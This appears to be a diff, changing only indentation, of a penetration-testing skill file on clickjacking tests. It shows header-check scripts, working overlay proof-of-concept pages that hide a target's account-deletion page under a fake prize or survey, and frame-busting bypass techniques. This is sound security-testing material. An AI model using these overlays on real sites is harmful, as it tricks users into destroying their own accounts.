@@ -1,8 +1,8 @@
 ---
 name: performing-clickjacking-attack-test
 description: Testing web applications for clickjacking vulnerabilities by assessing
-  frame embedding controls and crafting proof-of-concept overlay attacks during authorized
-  security assessments.
+ frame embedding controls and crafting proof-of-concept overlay attacks during authorized
+ security assessments.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -77,16 +77,16 @@ curl -s -I "https://target.example.com/" | grep -i "content-security-policy"
 
 # Test multiple sensitive pages
 for page in / /account/settings /account/delete /transfer \
-  /admin/dashboard /change-password /change-email; do
-  echo -n "$page: "
-  headers=$(curl -s -I "https://target.example.com$page")
-  xfo=$(echo "$headers" | grep -i "x-frame-options" | tr -d '\r')
-  csp=$(echo "$headers" | grep -i "content-security-policy" | grep -o "frame-ancestors[^;]*" | tr -d '\r')
-  if [ -z "$xfo" ] && [ -z "$csp" ]; then
-    echo "NO PROTECTION"
-  else
-    echo "${xfo:-none} | ${csp:-none}"
-  fi
+ /admin/dashboard /change-password /change-email; do
+ echo -n "$page: "
+ headers=$(curl -s -I "https://target.example.com$page")
+ xfo=$(echo "$headers" | grep -i "x-frame-options" | tr -d '\r')
+ csp=$(echo "$headers" | grep -i "content-security-policy" | grep -o "frame-ancestors[^;]*" | tr -d '\r')
+ if [ -z "$xfo" ] && [ -z "$csp" ]; then
+ echo "NO PROTECTION"
+ else
+ echo "${xfo:-none} | ${csp:-none}"
+ fi
 done
 
 # Check if JavaScript frame-busting is used (weak protection)
@@ -107,12 +107,12 @@ Attempt to embed the target page in an iframe to confirm vulnerability.
 
 <!-- Test basic framing -->
 <iframe src="https://target.example.com/account/settings"
-        width="800" height="600"
-        style="border: 2px solid red;">
+ width="800" height="600"
+ style="border: 2px solid red;">
 </iframe>
 
 <p>If you see "Refused to display" in console or blank iframe,
-   the page has frame protection.</p>
+ the page has frame protection.</p>
 </body>
 </html>
 ```
@@ -125,7 +125,7 @@ cat > frame-test.html << 'EOF'
 <body>
 <h1>Clickjacking Test</h1>
 <iframe src="https://target.example.com/account/settings"
-        width="800" height="600"></iframe>
+ width="800" height="600"></iframe>
 </body>
 </html>
 EOF
@@ -144,68 +144,68 @@ Build an overlay attack that tricks users into clicking hidden elements.
 <head>
 <title>Win a Prize!</title>
 <style>
-  body {
-    margin: 0;
-    padding: 0;
-    font-family: Arial, sans-serif;
-  }
+ body {
+ margin: 0;
+ padding: 0;
+ font-family: Arial, sans-serif;
+ }
 
-  /* Invisible iframe containing target page */
-  #target-frame {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    opacity: 0.0001;  /* Nearly invisible */
-    z-index: 2;       /* On top of decoy */
-    border: none;
-  }
+ /* Invisible iframe containing target page */
+ #target-frame {
+ position: absolute;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ opacity: 0.0001; /* Nearly invisible */
+ z-index: 2; /* On top of decoy */
+ border: none;
+ }
 
-  /* Decoy content that tricks the user */
-  #decoy {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 1;
-    background: white;
-  }
+ /* Decoy content that tricks the user */
+ #decoy {
+ position: absolute;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ z-index: 1;
+ background: white;
+ }
 
-  /* Position the "Click here" button exactly over the target's
-     sensitive button (adjust top/left values based on target layout) */
-  #click-bait {
-    position: absolute;
-    top: 350px;    /* Align with target's "Delete Account" button */
-    left: 400px;   /* Align horizontally */
-    padding: 15px 30px;
-    background: #4CAF50;
-    color: white;
-    font-size: 18px;
-    cursor: pointer;
-    border: none;
-    border-radius: 5px;
-  }
+ /* Position the "Click here" button exactly over the target's
+ sensitive button (adjust top/left values based on target layout) */
+ #click-bait {
+ position: absolute;
+ top: 350px; /* Align with target's "Delete Account" button */
+ left: 400px; /* Align horizontally */
+ padding: 15px 30px;
+ background: #4CAF50;
+ color: white;
+ font-size: 18px;
+ cursor: pointer;
+ border: none;
+ border-radius: 5px;
+ }
 </style>
 </head>
 <body>
 
 <!-- Decoy content visible to the user -->
 <div id="decoy">
-  <h1 style="text-align:center; margin-top:100px;">
-    Congratulations! You Won!
-  </h1>
-  <p style="text-align:center;">
-    Click the button below to claim your prize
-  </p>
-  <button id="click-bait">CLAIM PRIZE</button>
+ <h1 style="text-align:center; margin-top:100px;">
+ Congratulations! You Won!
+ </h1>
+ <p style="text-align:center;">
+ Click the button below to claim your prize
+ </p>
+ <button id="click-bait">CLAIM PRIZE</button>
 </div>
 
 <!-- Hidden iframe with target's sensitive action -->
 <iframe id="target-frame"
-  src="https://target.example.com/account/delete"
-  scrolling="no">
+ src="https://target.example.com/account/delete"
+ scrolling="no">
 </iframe>
 
 </body>
@@ -222,75 +222,75 @@ For actions requiring multiple clicks, create a multi-step overlay.
 <head>
 <title>Complete Survey</title>
 <style>
-  #target-frame {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    opacity: 0.0001;
-    z-index: 2;
-    border: none;
-  }
-  #step-container {
-    text-align: center;
-    margin-top: 200px;
-    z-index: 1;
-    position: relative;
-  }
-  .step { display: none; }
-  .step.active { display: block; }
-  .btn {
-    padding: 15px 40px;
-    font-size: 18px;
-    background: #2196F3;
-    color: white;
-    border: none;
-    cursor: pointer;
-    margin-top: 20px;
-  }
+ #target-frame {
+ position: absolute;
+ width: 100%;
+ height: 100%;
+ opacity: 0.0001;
+ z-index: 2;
+ border: none;
+ }
+ #step-container {
+ text-align: center;
+ margin-top: 200px;
+ z-index: 1;
+ position: relative;
+ }
+ .step { display: none; }
+ .step.active { display: block; }
+ .btn {
+ padding: 15px 40px;
+ font-size: 18px;
+ background: #2196F3;
+ color: white;
+ border: none;
+ cursor: pointer;
+ margin-top: 20px;
+ }
 </style>
 </head>
 <body>
 
 <div id="step-container">
-  <!-- Step 1: Click aligns with "Settings" link on target -->
-  <div class="step active" id="step1">
-    <h2>Step 1: Select your reward</h2>
-    <button class="btn" onclick="nextStep()"
-      style="position:absolute; top:200px; left:300px;">
-      Gold Package
-    </button>
-  </div>
+ <!-- Step 1: Click aligns with "Settings" link on target -->
+ <div class="step active" id="step1">
+ <h2>Step 1: Select your reward</h2>
+ <button class="btn" onclick="nextStep()"
+ style="position:absolute; top:200px; left:300px;">
+ Gold Package
+ </button>
+ </div>
 
-  <!-- Step 2: Click aligns with "Delete Account" button -->
-  <div class="step" id="step2">
-    <h2>Step 2: Confirm your choice</h2>
-    <button class="btn" onclick="nextStep()"
-      style="position:absolute; top:350px; left:400px;">
-      Confirm
-    </button>
-  </div>
+ <!-- Step 2: Click aligns with "Delete Account" button -->
+ <div class="step" id="step2">
+ <h2>Step 2: Confirm your choice</h2>
+ <button class="btn" onclick="nextStep()"
+ style="position:absolute; top:350px; left:400px;">
+ Confirm
+ </button>
+ </div>
 
-  <!-- Step 3: Click aligns with "Yes, I'm sure" confirmation -->
-  <div class="step" id="step3">
-    <h2>Step 3: Claim reward!</h2>
-    <button class="btn"
-      style="position:absolute; top:400px; left:450px;">
-      Claim Now!
-    </button>
-  </div>
+ <!-- Step 3: Click aligns with "Yes, I'm sure" confirmation -->
+ <div class="step" id="step3">
+ <h2>Step 3: Claim reward!</h2>
+ <button class="btn"
+ style="position:absolute; top:400px; left:450px;">
+ Claim Now!
+ </button>
+ </div>
 </div>
 
 <iframe id="target-frame"
-  src="https://target.example.com/account/settings">
+ src="https://target.example.com/account/settings">
 </iframe>
 
 <script>
 var currentStep = 1;
 function nextStep() {
-  document.getElementById('step' + currentStep).classList.remove('active');
-  currentStep++;
-  document.getElementById('step' + currentStep).classList.add('active');
-  // Optionally change iframe src for multi-page flows
+ document.getElementById('step' + currentStep).classList.remove('active');
+ currentStep++;
+ document.getElementById('step' + currentStep).classList.add('active');
+ // Optionally change iframe src for multi-page flows
 }
 </script>
 </body>
@@ -306,8 +306,8 @@ If JavaScript-based frame protection is used, attempt to bypass it.
 
 <!-- Technique 1: sandbox attribute blocks top-level navigation -->
 <iframe src="https://target.example.com/account/settings"
-  sandbox="allow-scripts allow-forms allow-same-origin"
-  width="800" height="600">
+ sandbox="allow-scripts allow-forms allow-same-origin"
+ width="800" height="600">
 </iframe>
 <!-- sandbox without allow-top-navigation prevents frame-busting -->
 
@@ -320,11 +320,11 @@ If JavaScript-based frame protection is used, attempt to bypass it.
 <!-- Technique 3: Intercept onbeforeunload -->
 <script>
 window.onbeforeunload = function() {
-  return "Are you sure?";  // Prevents navigation away
+ return "Are you sure?"; // Prevents navigation away
 };
 </script>
 <iframe src="https://target.example.com/account/settings"
-  width="800" height="600">
+ width="800" height="600">
 </iframe>
 
 <!-- Technique 4: Using data: URI or about:blank -->
@@ -332,7 +332,7 @@ window.onbeforeunload = function() {
 <script>
 var iframe = document.getElementById('f');
 iframe.contentDocument.write(
-  '<iframe src="https://target.example.com/account/settings" width="100%" height="100%"></iframe>'
+ '<iframe src="https://target.example.com/account/settings" width="100%" height="100%"></iframe>'
 );
 </script>
 ```
